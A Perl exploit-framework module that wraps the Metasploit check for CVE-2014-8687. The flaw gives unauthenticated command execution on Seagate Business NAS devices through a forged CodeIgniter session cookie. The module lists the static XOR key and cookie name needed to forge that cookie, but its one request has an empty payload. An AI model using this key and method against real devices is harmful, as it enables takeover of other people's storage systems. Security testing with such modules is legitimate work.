package SEAGATE::MSF::SeagateNasPhpExecNoauth;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "SeagateNasPhpExecNoauth";

   my $DETECTION = {

   };

my $EXPLOIT = {
  "CVE" => "CVE-2014-8687",
  "DESCRIPTION" => "

        Some Seagate Business NAS devices are vulnerable to command execution via a local

        file include vulnerability hidden in the language parameter of the CodeIgniter

        session cookie. The vulnerability manifests in the way the language files are

        included in the code on the login page, and hence is open to attack from users

        without the need for authentication. The cookie can be easily decrypted using a

        known static encryption key and re-encrypted once the PHP object string has been

        modified.



        This module has been tested on the STBN300 device.

      ",
  "METHOD" => "GET",
  "MSF_MODULE" => "seagate_nas_php_exec_noauth",
  "PATHS" => [""],
  "REFERENCES" => [
    "http://www.seagate.com/au/en/support/external-hard-drives/network-storage/business-storage-2-bay-nas/",
    "https://beyondbinary.io/advisory/seagate-nas-rce/",
  ],
  "TITLE" => "Seagate Business NAS Unauthenticated Remote Command Execution",
  "TITLE OF THE NAS ADMIN ACCOUNT" => "admin",
  VARIABLES => {
    'PATH' =>       { DESCRIPTION => "Path to the application root", VALUE => "/" },
    'XORKEY' =>       {
  DESCRIPTION => "XOR Key used for the CodeIgniter session",
  VALUE => "0f0a000d02011f0248000d290d0b0b0e03010e07",
},
    'COOKIEID' =>       {
  DESCRIPTION => "ID of the CodeIgniter session cookie",
  VALUE => "ci_session",
},
  },

  TYPE => 'MSF',
  PLATFORM => 'ALL',
  REQUESTS => {
    EXPLOIT7 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #7 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
